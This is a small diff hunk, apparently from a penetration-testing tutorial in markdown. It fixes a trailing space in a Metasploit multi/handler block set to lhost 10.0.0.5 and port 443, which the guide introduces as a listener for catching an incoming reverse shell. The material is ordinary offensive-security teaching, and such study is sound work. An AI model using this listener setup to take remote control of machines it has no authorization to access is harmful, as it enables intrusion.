@@ -95,7 +95,7 @@ Next, we setup a metasploit listener to catch the incoming reverse shell:
 
 {% code title="attacker@kali" %}
 ```csharp
-use exploit/multi/handler 
+use exploit/multi/handler
 set lhost 10.0.0.5
 set lport 443
 exploit
